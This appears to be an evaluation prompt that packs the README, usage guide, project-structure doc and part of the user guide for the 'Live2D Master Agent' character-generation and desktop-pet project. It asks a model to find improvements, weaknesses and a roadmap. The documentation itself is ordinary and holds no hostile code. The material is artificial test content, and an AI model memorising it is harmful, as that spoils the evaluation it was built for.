# Live2D Master Agent - 专家模式上下文

> 生成时间：2026-06-29 09:40:05
> 用途：测试新模型对大型项目上下文的理解、更新点识别与不足点解决能力
> 目标大小：约 400KB

## 评估任务（请新模型在完整阅读上下文后回答）

1. **更新点分析**：基于当前项目状态，列出 5-10 个最有价值的下一步功能更新或优化点，按优先级排序。
2. **不足点识别**：从代码质量、架构设计、安全性、可维护性、用户体验、性能等维度，找出当前项目的主要不足。
3. **解决方案设计**：针对每个不足点，给出具体的、可落地的解决方案，包括代码/配置改动建议。
4. **路线图建议**：如果让你负责 v7.3 / v8.0 版本，你会如何规划迭代路线？
5. **专家模式验证**：评估当前 `SKILL.md` 中的专家模式设计是否合理，是否需要补充新的命令或工作流。

---

## 项目主文档
**文件**：`README.md`
```
# 🎨 Live2D Master 

> **专业的AI辅助Live2D制作助手 - 从概念到绑定的完整工作流,同时能够做到一键部署到桌面上**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![Stars](https://img.shields.io/github/stars/mw2wbyys6t-sudo/Live2D)](https://github.com/mw2wbyys6t-sudo/Live2D/stargazers)
[![Version](https://img.shields.io/badge/version-v7.2-green.svg)]()
[![Last Update](https://img.shields.io/badge/last%20update-2026--06--17-orange.svg)]()

---

## ✨ 一句话介绍

**3分钟创建专业Live2D角色！** 无需付费，一键生成，立即使用。

集成 [See-through](https://github.com/shitagaki-lab/see-through) (SIGGRAPH 2026) 专业级AI分层工具，提供从图像生成到PSD分层的完整工作流。

**🔥 v7.1 新增：桌面桌宠功能！** 无需Live2D软件，一键将角色部署为桌面宠物，支持动画、表情和交互！

---

## 🚀 3分钟快速开始

### 第一步：安装

```bash
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git
cd Live2D
pip install -r requirements.txt
```

### 第二步：生成角色（命令模式）

```bash
python master_tool.py "cute anime girl, pink hair"
```

### 第三步：交互式终端 Agent 模式（推荐新手）

```bash
python live2d_agent.py
```

进入菜单后选择数字或直接用自然语言描述角色，例如：

```text
1
cute anime girl, pink hair
```

### 第四步：专业分层（推荐）

```bash
# 安装 See-through（一次性）
python install_comfyui_advanced.py

# 查看 See-through 使用指南
python master_tool.py --see-through
```

### 第五步：完成！

系统会自动：
- ✅ 生成高质量角色立绘
- ✅ 使用 See-through 进行专业级分层
- ✅ 提供完整的工作流程

**就是这么快！** ⚡

### 第六步：桌面桌宠（v7.2新功能）

```bash
# 一键创建桌面宠物
python live2d_workflow.py "蓝发猫耳少女" --deploy-desktop

# 运行桌宠（使用 --run 指定桌宠目录）
python live2d_desktop_pet.py --run pet_output
```

**桌宠功能：**
- ✅ 动画身体摆动
- ✅ 表情切换（微笑、眨眼、害羞等）
- ✅ 鼠标交互（点击、拖拽）
- ✅ 自动移动

---

## 🎯 核心功能

### 🎨 AI图像生成
- 完全免费，无需API密钥
- 一键生成高质量角色立绘
- 94种特征组合，避免撞衫
- 多服务自动降级机制
- **v6.2新增：** 智能重试机制，大幅提升成功率
- **v6.2新增：** 可自定义图片分辨率（--width, --height）
- **v6.2新增：** 优化的提示词，更适合Live2D制作
- **v6.2新增：** 支持Flux模型，图片质量更好

### 📐 专业分层（See-through - SIGGRAPH 2026）

**🏆 推荐：See-through AI分层工具**

- **SIGGRAPH 2026 级别**研究技术
- 使用 **LayerDiff 3D** + **Marigold Depth**
- 专为动漫角色设计
- 透明背景 + 完美分层

**内置备选工具**：
- v6.0 分层工具（K-means聚类）
- v5.0 分层工具（简单颜色检测）

### ⚡ 效率提升
- 角色生成：2-3小时 → 30秒（**提升240倍+**）
- PSD分层：1-2小时 → See-through 10秒（**提升360倍+**）
- 总流程：4-5小时 → 3分钟（**提升100倍+**）

### 🐱 桌面桌宠（v7.2新功能）
- **无需Live2D软件**：脱离原生Live2D Cubism Editor，一键部署
- **能动的Live2D形象**：身体摆动、眨眼、呼吸动画
- **表情系统**：支持正常、开心、害羞、惊讶、困倦等表情
- **交互响应**：点击互动、拖拽移动、悬停跟随
- **一键部署**：自动生成桌宠运行包，双击即可运行
- **跨平台支持**：支持Windows（批处理）和Mac/Linux

---

## 📚 文档导航

| 文档 | 说明 | 优先级 |
|------|------|--------|
| [📖 README.md](README.md) | 项目主文档 | ⭐⭐⭐⭐⭐ |
| [🚀 QUICKSTART.md](docs/QUICKSTART.md) | 3分钟快速入门 | ⭐⭐⭐⭐⭐ |
| [📖 USER_GUIDE.md](docs/USER_GUIDE.md) | 完整使用教程 | ⭐⭐⭐⭐ |
| [📐 SEE_THROUGH_INTEGRATION.md](docs/SEE_THROUGH_INTEGRATION.md) | See-through集成指南 | ⭐⭐⭐⭐⭐ |
| [📁 PROJECT_STRUCTURE.md](docs/PROJECT_STRUCTURE.md) | 项目结构说明 | ⭐⭐⭐ |
| [❓ FAQ.md](docs/FAQ.md) | 常见问题解答 | ⭐⭐⭐⭐ |
| [💡 BEST_PRACTICES.md](docs/BEST_PRACTICES.md) | 最佳实践 | ⭐⭐⭐ |
| [⚠️ LIMITATIONS.md](docs/LIMITATIONS.md) | 已知限制 | ⭐⭐⭐ |
| [📋 CHANGELOG.md](CHANGELOG.md) | 更新日志 | ⭐⭐ |
| [🔬 GITHUB_RESEARCH.md](docs/GITHUB_RESEARCH.md) | GitHub研究报告 | ⭐⭐ |

---

## 🎯 适用场景

| 场景 | 说明 | 收益 |
|------|------|------|
| 🎬 **VTuber创作** | 快速制作虚拟形象 | 节省数小时 |
| 🎮 **游戏开发** | 低成本角色设计 | 无需外包 |
| 🎨 **动画制作** | 标准化工作流 | 效率翻倍 |
| 💡 **AI爱好者** | 探索创作可能 | 无限创意 |

---

## 📁 项目结构

本项目同时作为 **Trae IDE Skill** 和 **独立命令行工具** 使用。根目录下的 Python 脚本是轻量包装器，自动将调用转发到 `.trae/skills/live2d-master-agent/` 下的实际实现，因此你可以直接在仓库根目录运行所有命令，无需手动切换目录。

```
Live2D/
├── master_tool.py              # 一站式工具箱（包装器）
├── live2d_workflow.py          # 端到端工作流（包装器）
├── live2d_desktop_pet.py       # 桌面桌宠（包装器）
├── live2d_agent.py             # 交互式Agent（包装器）
├── live2d_layer_v6.py          # K-means分层（包装器）
├── live2d_layer_pro.py         # 颜色检测分层（包装器）
├── config_api.py               # API配置（包装器）
├── install_comfyui_advanced.py # See-through安装（包装器）
├── requirements.txt            # Python 依赖
├── tests/                      # 测试脚本（包装器）
├── scripts/                    # 辅助脚本（包装器）
├── docs/                       # 详细文档
├── examples/                   # 使用案例
├── prompts/                    # 提示词模板
├── templates/                  # Live2D 模板
├── lib/                        # 共享 TypeScript 工作流库（Web UI 使用）
├── web/                        # Next.js Web UI
├── comfyui-connector/          # ComfyUI TypeScript 连接器
└── .trae/skills/live2d-master-agent/   # 核心实现（Trae Skill）
```

---

## 🎮 两种使用模式

### 1. 终端 Agent 模式（命令行交互）

适合在终端中使用，支持菜单选择和自然语言命令。

```bash
# 启动交互式 Agent
python live2d_agent.py
```

- 支持中文/英文自然语言指令
- 菜单驱动，新手友好
- 可快速生成角色、分层、部署桌宠

### 2. Trae Skill 模式（IDE 内 AI 助手）

将本仓库作为 [Trae IDE](https://www.trae.ai/) 的 Skill 使用，在编辑器内直接调用。

**安装方法：**

1. 将本仓库克隆到任意目录：

```bash
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git
```

2. 在 Trae 中加载 `.trae/skills/live2d-master-agent/` 目录作为 Skill：
   - 打开 Trae → Settings → Skills → Add Skill
   - 选择 `<仓库目录>/.trae/skills/live2d-master-agent`
   - 或直接将整个仓库作为项目打开，Trae 会自动识别 `SKILL.md`

**Skill 使用链接：**
- 项目首页：`https://github.com/mw2wbyys6t-sudo/Live2D`
- Skill 入口：`.trae/skills/live2d-master-agent/SKILL.md`

> 两种模式共享同一套核心实现，输出目录和配置文件均统一在项目根目录的 `output/` 和 `.env` 中。

---

## 🛠️ 工具列表

### 核心工具

| 工具 | 说明 | 推荐度 |
|------|------|------|
| [master_tool.py](master_tool.py) | 一站式工具箱 | ⭐⭐⭐⭐⭐ |
| [live2d_workflow.py](live2d_workflow.py) | **端到端完整工作流** | ⭐⭐⭐⭐⭐ |
| [live2d_desktop_pet.py](live2d_desktop_pet.py) | **桌面桌宠** | ⭐⭐⭐⭐⭐ |
| [live2d_agent.py](live2d_agent.py) | 交互式Agent（菜单驱动） | ⭐⭐⭐⭐ |
| [install_comfyui_advanced.py](install_comfyui_advanced.py) | **See-through一键安装** | ⭐⭐⭐⭐⭐ |
| [live2d_layer_v6.py](live2d_layer_v6.py) | K-means分层工具 | ⭐⭐⭐⭐ |
| [live2d_layer_pro.py](live2d_layer_pro.py) | 颜色检测分层 | ⭐⭐⭐ |
| [config_api.py](config_api.py) | API配置 | ⭐⭐⭐⭐ |
| [tests/create_test_image.py](tests/create_test_image.py) | 测试图像生成 | ⭐⭐⭐ |

### 辅助脚本

| 脚本 | 说明 |
|------|------|
| [scripts/qa_engine_enhanced.py](scripts/qa_engine_enhanced.py) | 质量检查 |
| [scripts/parameter_designer_enhanced.py](scripts/parameter_designer_enhanced.py) | 参数设计器 |
| [scripts/physics_helper.py](scripts/physics_helper.py) | 物理设置 |

### 测试脚本

| 脚本 | 说明 |
|------|------|
| [tests/test_workflow.py](tests/test_workflow.py) | 工作流基础测试 |
| [tests/test_full_coverage.py](tests/test_full_coverage.py) | 功能全覆盖测试 |
| [tests/test_deep_coverage.py](tests/test_deep_coverage.py) | 30 项深度测试 |

---

## 💡 技术亮点

### 🏆 See-through AI分层（SIGGRAPH 2026）

See-through 是目前最先进的AI图像分层工具，已集成到本项目中！

**技术优势**：
- LayerDiff 3D：生成透明背景和分层图像
- Marigold Depth：精确深度估计
- 专为动漫角色优化
- 支持PSD直接导出

**工作流程**：
```bash
# 1. 安装 See-through（ComfyUI集成）
python install_comfyui_advanced.py

# 2. 在 ComfyUI 中加载工作流
# 3. 输入图片，自动分层
# 4. 导出PSD
```

详细文档：[SEE_THROUGH_INTEGRATION.md](docs/SEE_THROUGH_INTEGRATION.md)

### 多样化特征系统
每次生成自动随机组合 **94个特征**，确保每个角色独一无二！

| 特征类型 | 数量 | 示例 |
|---------|------|------|
| 发型 | 15种 | 长直发、双马尾、丸子头... |
| 发色 | 15种 | 粉色、紫色、蓝色... |
| 眼睛颜色 | 10种 | 蓝色、绿色、异瞳... |
| 服装 | 14种 | 校服、和服、女仆装... |
| 配饰 | 12种 | 发带、眼镜、帽子... |
| 表情 | 13种 | 微笑、害羞、冷酷... |
| 姿势 | 9种 | 站立、坐着、挥手... |

### 多服务自动降级
```
用户请求
    ↓
Pollinations.ai（免费）✅
    ↓ (失败)
备用服务 ✅
    ↓ (失败)
ComfyUI本地 ✅
    ↓
显示备选方案
```

---

## 📖 使用示例

### 基本生成

```bash
# 生成角色（默认768x768）
python master_tool.py "beautiful anime girl"

# 生成5个不同角色
python master_tool.py -n 5 "anime girl"

# 自定义分辨率（v6.2新功能）
python master_tool.py --width 1024 --height 1024 "anime girl"

# 使用已有图片
python master_tool.py --skip-generate

# 查看 See-through 指南
python master_tool.py --see-through
```

### 🏆 See-through 专业分层

```bash
# 1. 安装（首次使用）
python install_comfyui_advanced.py

# 2. 启动 ComfyUI
cd comfyui
python main.py

# 3. 浏览器访问 http://127.0.0.1:8188
# 4. 加载 See-through 工作流
# 5. 输入图片，自动分层
```

### 内置分层工具（备选）

```bash
# v6.0 K-means分层
python live2d_layer_v6.py character.png output_dir

# 测试工具
python tests/create_test_image.py
python live2d_layer_v6.py test_character.png test_output
```

### 配置API（可选）

```bash
python config_api.py
```

### 🐱 桌面桌宠使用

```bash
# 方式1：完整工作流 + 桌面部署
python live2d_workflow.py "蓝发猫耳少女" --deploy-desktop

# 方式2：使用现有图片创建桌宠
python live2d_workflow.py --input character.png --deploy-desktop

# 方式3：仅创建桌宠（从分层目录）
python live2d_desktop_pet.py --layers-dir layers_12345 --output my_pet

# 方式4：从PSD文件创建桌宠
python live2d_desktop_pet.py --psd layers.psd --output my_pet

# 运行桌宠
python live2d_desktop_pet.py --run my_pet
```

---

## 🛠️ 系统要求

- Python 3.8+
- 网络连接
- 可选：火山引擎API密钥（更高质量）
- 可选：See-through（ComfyUI集成，需要更多资源）

**See-through 推荐配置**：
- NVIDIA GPU（可选，加速推理）
- 8GB+ 内存
- 20GB+ 磁盘空间（模型）

---

## 📦 安装

```bash
# 克隆
git clone https://github.com/mw2wbyys6t-sudo/Live2D.git
cd Live2D

# 安装依赖
pip install -r requirements.txt

# 开始使用
python master_tool.py "你的角色描述"

# 可选：安装 See-through（专业分层）
python install_comfyui_advanced.py
```

---

## 🤝 贡献

欢迎贡献！请参考以下方式：

1. 🐛 报告问题：[GitHub Issues](https://github.com/mw2wbyys6t-sudo/Live2D/issues)
2. 💡 提出建议：[GitHub Discussions](https://github.com/mw2wbyys6t-sudo/Live2D/discussions)
3. 🔧 提交代码：Pull Request

贡献指南：
- 请确保代码经过测试
- 遵循项目的代码风格
- 更新相关文档

---

## 📄 许可证

MIT License - 详见 [LICENSE](LICENSE)

---

## 🙏 致谢

- [Pollinations.ai](https://pollinations.ai/) - 免费图像生成
- [Live2D Cubism](https://www.live2d.com/) - 2D动画技术
- [火山引擎](https://www.volcengine.com/) - Seedream API
- [See-through (Shitagaki Lab)](https://github.com/shitagaki-lab/see-through) - **SIGGRAPH 2026 AI分层技术**
- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) - 节点式工作流工具
- [LayerDiffusion](https://github.com/layerdiffusion/) - 透明图像生成
- 所有贡献者和支持者！

---

## 📞 联系与支持

- 🐛 报告问题：[GitHub Issues](https://github.com/mw2wbyys6t-sudo/Live2D/issues)
- 💡 建议反馈：[GitHub Discussions](https://github.com/mw2wbyys6t-sudo/Live2D/discussions)
- 📖 文档更新：[持续优化中]

---

## ⭐ 支持项目

如果这个项目对你有帮助，请：
- ⭐ Star 这个项目
- 🍴 Fork 并个性化定制
- 📢 分享给需要的朋友

---

## 📋 快速链接

| 功能 | 链接 |
|------|------|
| 快速入门 | [QUICKSTART.md](docs/QUICKSTART.md) |
| See-through指南 | [SEE_THROUGH_INTEGRATION.md](docs/SEE_THROUGH_INTEGRATION.md) |
| 常见问题 | [FAQ.md](docs/FAQ.md) |
| 项目结构 | [PROJECT_STRUCTURE.md](docs/PROJECT_STRUCTURE.md) |
| 更新日志 | [CHANGELOG.md](CHANGELOG.md) |
| 已知限制 | [LIMITATIONS.md](docs/LIMITATIONS.md) |

---

**让Live2D制作更简单！** 🎨

*版本: v7.2（整理项目结构+修复根目录路径问题+桌面桌宠功能+See-through集成）*
*最后更新: 2026-06-17*

```

## 使用说明
**文件**：`USAGE.md`
```
# Live2D Master Agent 使用说明

本文档说明如何安装、配置和使用 Live2D Master Agent 项目，涵盖终端 Agent 模式、Trae Skill 模式以及 Web UI。

## 目录

- [环境要求](#环境要求)
- [安装依赖](#安装依赖)
- [终端 Agent 模式](#终端-agent-模式)
- [Trae Skill 模式](#trae-skill-模式)
- [Web UI](#web-ui)
- [常用命令](#常用命令)
- [常见问题排查](#常见问题排查)

---

## 环境要求

- **Python**: 3.8 或更高版本（推荐 3.11 / 3.12，兼容性最好）
- **Node.js**: 18 或更高版本（仅使用 Web UI 时需要）
- **操作系统**: Windows、macOS、Linux 均可
- **网络**: 部分功能需要调用外部 AI API（如图像生成）

> 注意：Python 3.14+ 的部分可选依赖可能没有预编译包，安装脚本会自动跳过不影响核心功能的包。

---

## 安装依赖

在项目根目录执行：

```bash
python install.py
```

如需尝试安装所有可选依赖：

```bash
python install.py --full
```

安装完成后，脚本会自动创建 `.env` 示例文件。请根据实际使用的 AI 服务填写 API 密钥：

```bash
# 编辑 .env
SK_API_KEY=your_key_here
SEEDREAM_API_KEY=your_key_here
```

---

## 终端 Agent 模式

终端 Agent 模式适合在命令行中交互式使用，支持菜单选择和自然语言指令。

### 启动

```bash
python live2d_agent.py
```

### 交互示例

进入 Agent 后，可以直接输入数字菜单选项或自然语言命令：

```text
[1] Generate Character  - 根据描述生成角色
[2] Layer Separation    - 将图片拆分为 Live2D 图层
[3] Desktop Pet         - 部署为桌面桌宠
[4] Full Workflow       - 生成 + 分层 + 桌宠一键完成
[5] Settings            - 配置 API 密钥和输出目录
[6] Help                - 查看帮助
[0] Exit                - 退出
```

示例命令：

```text
generate a cute anime girl
layer my_character.png
deploy pet
```

也支持中文关键词：

```text
生成一个猫娘
拆分图片
部署桌宠
```

---

## Trae Skill 模式

Trae Skill 模式将项目作为 [Trae IDE](https://www.trae.ai/) 的 AI Skill 使用，可在编辑器内直接调用。

### 加载 Skill

1. 打开 Trae IDE
2. 进入 Settings → Skills → Add Skill
3. 选择本仓库目录下的 `.trae/skills/live2d-master-agent/`
4. 或直接将整个仓库作为项目打开，Trae 会自动识别 `SKILL.md`

### 使用方式

在 Trae 中激活 Skill 后，可以直接用自然语言描述需求，例如：

- "帮我生成一个 Live2D 角色"
- "检查这个 PSD 文件是否符合 Live2D 规范"
- "把这张图拆分成 Live2D 图层"

---

## Web UI

Web UI 是基于 Next.js 的 PSD 质量检测与图片转 PSD 工具。

### 启动开发服务器

```bash
cd web
npm install
npm run dev
```

默认在 `http://localhost:3000` 打开。

### 功能

- **PSD 检测**: 上传 PSD 文件，自动检查图层命名、结构完整性、风险评分等
- **图片转 PSD**: 将普通图片转换为 PSD 格式

---

## 常用命令

### 一站式工具箱

```bash
python master_tool.py "cute anime girl"
```

### 端到端工作流

```bash
python live2d_workflow.py "描述"
```

### 角色分层

```bash
# v6.0 K-means 分层
python live2d_layer_v6.py character.png output_dir

# v5.0 颜色检测分层
python live2d_layer_pro.py character.png output_dir
```

### 桌面桌宠

```bash
python live2d_desktop_pet.py character.png
```

### 测试工具

```bash
# 生成测试图像
python tests/create_test_image.py

# 运行工作流测试
python tests/test_workflow.py

# 运行全覆盖测试
python tests/test_full_coverage.py

# 运行 30 项深度测试
python tests/test_deep_coverage.py
```

### 配置 API

```bash
python config_api.py
```

---

## 常见问题排查

### 1. 提示缺少依赖

错误示例：

```text
[ERROR] Missing required dependencies: Pillow, numpy, requests, psd-tools
```

解决方案：

```bash
python install.py
```

或手动安装核心包：

```bash
python -m pip install Pillow numpy requests psd-tools scipy scikit-learn
```

### 2. Windows 终端乱码或 emoji 显示异常

项目已在入口脚本中配置了 `utf-8` 编码。如果仍有问题，请尝试：

```powershell
chcp 65001
```

### 3. Web UI 编译报错

确保已安装依赖：

```bash
cd web
npm install
```

然后运行：

```bash
npx tsc --noEmit
```

### 4. TypeScript 提示找不到模块

如果看到类似 `Cannot find module '../lib/types'` 的错误，请确认：

- `web/lib-shared/` 目录存在且包含 `types.ts` 和 `workflow.ts`
- 相关组件已使用 `../lib-shared/*` 路径导入

### 5. Python 3.14 下部分包安装失败

属于正常现象。安装脚本会跳过没有预编译包的可选依赖，核心功能仍可正常运行。

### 6. 运行 See-through 安装失败

See-through 依赖 ComfyUI 环境。请确保：

- 已安装 ComfyUI
- 已配置正确的 Python 环境
- 运行：

```bash
python install_comfyui_advanced.py
```

---

## 项目结构速览

```text
Live2D/
├── live2d_agent.py             # 交互式 Agent（推荐入口）
├── master_tool.py              # 一站式工具箱
├── live2d_workflow.py          # 端到端工作流
├── install.py                  # 兼容性安装脚本
├── requirements.txt            # Python 依赖列表
├── tests/                      # 测试脚本
├── scripts/                    # 辅助脚本
├── docs/                       # 详细文档
├── examples/                   # 使用案例
├── prompts/                    # 提示词模板
├── templates/                  # Live2D 模板
├── lib/                        # TypeScript 共享库
├── web/                        # Next.js Web UI
├── comfyui-connector/          # ComfyUI 连接器
└── .trae/skills/live2d-master-agent/   # 核心实现（Trae Skill）
```

---

## 获取更多帮助

- 项目文档: [docs/](docs/)
- 快速入门: [docs/QUICKSTART.md](docs/QUICKSTART.md)
- 用户指南: [docs/USER_GUIDE.md](docs/USER_GUIDE.md)
- 常见问题: [docs/FAQ.md](docs/FAQ.md)

```

## 项目结构说明
**文件**：`docs/PROJECT_STRUCTURE.md`
```
# 📁 Live2D Master Agent - 项目结构说明

本文档详细说明了项目的文件结构和每个文件的用途。

---

## 📂 目录结构

```
live2d-master-agent/
├── 📄 README.md                    # 项目主文档
├── 📄 LICENSE                      # MIT许可证
├── 📄 requirements.txt             # Python依赖
├── 📄 .gitignore               # Git忽略配置
├── 📄 .env.example             # 环境变量示例
│
├── 📁 docs/                      # 文档目录
│   └── 📄 RIGGING_GUIDE.md      # Live2D绑定指南
│
├── 📁 scripts/                   # 辅助脚本
│   ├── 📄 auto_naming.py          # 自动命名工具
│   ├── 📄 layer_checker.py        # 图层检查工具
│   ├── 📄 parameter_designer_enhanced.py # 参数设计器
│   ├── 📄 physics_helper.py       # 物理设置助手
│   ├── 📄 qa_engine_enhanced.py  # 质量检查引擎
│   └── 📄 seedream_image_generate.py # Seedream图像生成
│
├── 📁 prompts/                  # 提示词模板
│   ├── 📄 image_generation.md     # 图像生成提示词
│   ├── 📄 naming.md             # 命名提示词
│   ├── 📄 physics.md            # 物理提示词
│   ├── 📄 qa.md               # 质量检查提示词
│   ├── 📄 rigging.md          # 绑定提示词
│   └── 📄 split.md            # 分层提示词
│
├── 📁 templates/               # 模板文件
│   ├── 📄 cubism_params.md     # Cubism参数模板
│   ├── 📄 export_rules.md     # 导出规则模板
│   └── 📄 psd_structure.md    # PSD结构模板
│
├── 📁 docs/                    # 文档目录
│
├── 📄 master_tool.py              # 🎯 主工具（v6.1）
├── 📄 live2d_layer_v6.py         # 🎯 v6.0分层工具（K-means）
├── 📄 live2d_layer_pro.py       # 🎯 v5.0分层工具（简单）
├── 📄 install_comfyui_advanced.py # 🎯 See-through安装器
├── 📄 install_comfyui.py         # ComfyUI安装器（旧版）
├── 📄 config_api.py          # API配置工具
├── 📄 config.py             # 配置文件
├── 📄 comfyui_integration.py    # ComfyUI集成
├── 📁 tests/                    # 测试脚本目录
│   ├── 📄 create_test_image.py   # 测试图像生成工具
│   ├── 📄 test_workflow.py       # 工作流基础测试
│   ├── 📄 test_full_coverage.py  # 功能全覆盖测试
│   └── 📄 test_deep_coverage.py  # 30 项深度测试
│
├── 📄 AI_LAYERING_GUIDE.md     # AI分层指南
├── 📄 BEST_PRACTICES.md        # 最佳实践
├── 📄 CHANGELOG.md           # 更新日志
├── 📄 FAQ.md                 # 常见问题
├── 📄 GITHUB_RESEARCH.md        # GitHub研究报告
├── 📄 LIMITATIONS.md          # 已知限制
├── 📄 QUICKSTART.md         # 快速入门
├── 📄 SEE_THROUGH_INTEGRATION.md # See-through集成指南
├── 📄 SKILL.md               # Skill文档
└── 📄 USER_GUIDE.md          # 用户指南
```

---

## 📄 核心工具详解

### 🏆 主要工具

| 文件名 | 版本 | 说明 | 推荐度 |
|--------|------|------|--------|
| **[master_tool.py](master_tool.py)** | v6.1 | 一站式主工具，集成所有功能 | ⭐⭐⭐⭐⭐ |
| **[live2d_layer_v6.py](live2d_layer_v6.py)** | v6.0 | K-means聚类分层工具 | ⭐⭐⭐⭐ |
| **[install_comfyui_advanced.py](install_comfyui_advanced.py)** | v2.0 | See-through安装器 | ⭐⭐⭐⭐⭐ |
| **[live2d_layer_pro.py](live2d_layer_pro.py)** | v5.0 | 简单颜色检测分层 | ⭐⭐⭐ |

### 🔧 辅助工具

| 文件名 | 说明 |
|--------|------|
| [config_api.py](config_api.py) | API配置工具 |
| [tests/create_test_image.py](tests/create_test_image.py) | 测试图像生成 |

---

## 📚 文档文件

| 文件名 | 内容 |
|--------|------|
| [README.md](README.md) | 项目主文档 |
| [QUICKSTART.md](QUICKSTART.md) | 快速入门指南（3分钟） |
| [USER_GUIDE.md](USER_GUIDE.md) | 完整使用教程 |
| [SEE_THROUGH_INTEGRATION.md](SEE_THROUGH_INTEGRATION.md) | See-through集成指南 |
| [FAQ.md](FAQ.md) | 常见问题解答 |
| [BEST_PRACTICES.md](BEST_PRACTICES.md) | 最佳实践和技巧 |
| [LIMITATIONS.md](LIMITATIONS.md) | 已知限制说明 |
| [CHANGELOG.md](CHANGELOG.md) | 更新日志 |
| [GITHUB_RESEARCH.md](GITHUB_RESEARCH.md) | GitHub项目研究报告 |
| [SKILL.md](SKILL.md) | Skill文档 |

---

## 📁 目录说明

### docs/
详细文档目录

### scripts/
辅助脚本集合
- 质量检查、参数设计、物理设置等工具

### prompts/
AI提示词模板
- 图像生成、命名、物理等

### templates/
工作模板文件
- Cubism参数、导出规则、PSD结构

---

## 🎯 工作流程建议

### 1️⃣ 快速开始
```bash
# 1. 安装
python master_tool.py "cute anime girl"
```

### 2️⃣ 专业分层
```bash
# 1. 安装 See-through
python install_comfyui_advanced.py
# 2. 使用工作流
```

### 3️⃣ 测试工具
```bash
# 生成测试图像
python tests/create_test_image.py
# 使用v6分层
python live2d_layer_v6.py test_character.png
```

---

## 🔧 配置文件

```

## 完整使用教程（节选）
**文件**：`docs/USER_GUIDE.md`
```
# 📖 Live2D Master Agent - 完整使用教程

**详细指南，让你成为Live2D大师！**

---

## 📋 目录

1. [工具介绍](#工具介绍)
2. [基础使用](#基础使用)
3. [高级功能](#高级功能)
4. [配置选项](#配置选项)
5. [最佳实践](#最佳实践)

---

## 🛠️ 工具介绍

### 核心工具

#### 1. master_tool.py ⭐推荐
**一站式工具箱**，集成所有核心功能

```bash
python master_tool.py "your character description"
```

**功能**：
- AI图像生成（免费）
- 多样化特征组合
- PSD分层规划
- 质量检查

#### 2. live2d_layer_pro.py
**专业分层工具**，生成符合Live2D规范的PSD

```bash
python live2d_layer_pro.py character.png
```

**功能**：
- 25+图层自动分层
- 眼部细节分离
- 口型变化生成
- Live2D标准命名

#### 3. config_api.py
**API配置工具**，配置可选的付费API

```bash
python config_api.py
```

---

## 🎯 基础使用

### 生成角色立绘

#### 基本生成

```bash
python master_tool.py "cute anime girl with pink hair"
```

**推荐提示词结构**：
```
[角色描述] + [特征] + [风格] + [质量词]
```

**示例**：
```bash
# 清晰描述
python master_tool.py "beautiful anime girl, long pink hair, blue eyes, school uniform"

# 强调风格
python master_tool.py "chibi anime character, cute, pastel colors, soft lighting"

# 强调Live2D适用
python master_tool.py "anime girl, clean lineart, white background, perfect for Live2D"
```

#### 生成多个角色

```bash
# 生成5个不同角色
python master_tool.py -n 5 "anime girl"

# 生成10个角色
python master_tool.py -n 10 "cute catgirl"
```

系统会自动为每个角色组合不同的特征（发型、发色、服装等），确保每个都独一无二！

#### 使用已有图片

```bash
# 图片在当前目录
python master_tool.py --skip-generate

# 指定图片路径
python master_tool.py --skip-generate my_character.png
```

---

## 🔧 高级功能

### 多样化特征系统

系统会自动随机组合以下特征：

| 特征类型 | 示例选项 |
|---------|---------|
| 发型 | 长直发、双马尾、短发、丸子头... |
| 发色 | 粉色、紫色、蓝色、金色、银色... |
| 眼睛颜色 | 蓝色、绿色、粉色、红色、异瞳... |
| 服装 | 校服、和服、女仆装、泳装、西装... |
| 配饰 | 发带、眼镜、帽子、项链、耳环... |
| 表情 | 微笑、害羞、冷酷、惊讶、生气... |
| 姿势 | 站立、坐着、挥手、奔跑、跳舞... |

### 手动指定特征

**提示词示例**：
```bash
# 指定发型和发色
python master_tool.py "anime girl, long twintails, silver hair"

# 指定服装
python master_tool.py "anime girl, maid outfit, pink apron"

# 指定多个特征
python master_tool.py "anime girl with fox ears, white hair, red eyes, kimono"
```

### 质量优化提示词

在描述末尾添加这些词可以提升质量：

```bash
python master_tool.py "anime girl, best quality, masterpiece, ultra detailed"
```

**推荐质量词**：
- `best quality` - 最佳质量
- `masterpiece` - 杰作级
- `ultra detailed` - 超精细
- `perfect for Live2D` - 适合Live2D
- `clean lineart` - 干净线稿
- `white background` - 白色背景

---

## ⚙️ 配置选项

### 查看帮助

```bash
python master_tool.py --help
```

### 配置API（可选）

#### 为什么配置API？
- 更精细的图像控制
- 更高的生成质量
- 更快生成速度

#### 如何配置

```bash
python config_api.py
```

按照提示输入火山引擎API密钥。

**获取API密钥**：
1. 访问 https://www.volcengine.com/
2. 注册账号
3. 获取API密钥

#### 使用配置

配置后，系统会优先使用付费API。

### 环境变量配置

创建 `.env` 文件（参考 `.env.example`）：

```bash
# 可选：火山引擎API
ARK_API_KEY=your-api-key-here
ARK_BASE_URL=https://ark.cn-beijing.volces.com/api/v3

# 输出配置
OUTPUT_DIR=./output
MAX_PSD_SIZE_MB=50
```

---

## 💡 最佳实践

### 提示词技巧

#### ✅ 推荐做法

1. **具体描述**
   ```bash
   # ❌ 模糊
   python master_tool.py "girl"
   
   # ✅ 具体
   python master_tool.py "anime girl, long pink hair, blue eyes, white dress, standing pose"
   ```

2. **分层描述**
   ```bash
   # 从整体到细节
   "beautiful anime girl, long flowing hair, green eyes, school uniform, red bow in hair, smiling"
   ```

3. **添加风格词**
   ```bash
   "anime girl, detailed eyes, soft lighting, pastel colors, clean lineart"
   ```

#### ❌ 避免做法

1. **过长描述** - 50-100词最佳
2. **矛盾描述** - 不要同时说"可爱"和"恐怖"
3. **模糊词汇** - "好看的"不如"微笑"

### 角色设计技巧

#### 创建一致性角色系列

```bash
# 主角
python master_tool.py "anime girl, blue hair, determined eyes, red cape, hero outfit"

# 同系列角色
python master_tool.py "anime girl, blue hair, cheerful smile, blue dress, white apron"

# 反派
python master_tool.py "anime girl, blue hair, cold eyes, dark armor, villain"
```

#### 创建多样化团队

```bash
# 生成5个团队成员
python master_tool.py -n 5 "anime girl wizard, magical academy uniform"

# 每个都有独特发型和服装
```

### 分层技巧

#### 最佳分层图片特征

✅ **适合分层**：
- 清晰的前景/背景分离
- 单色或简单背景
- 清晰的轮廓线
- 无过多特效

❌ **难以分层**：
- 复杂背景
- 烟雾/火焰效果
- 低分辨率
- 模糊图片

#### 提高分层质量

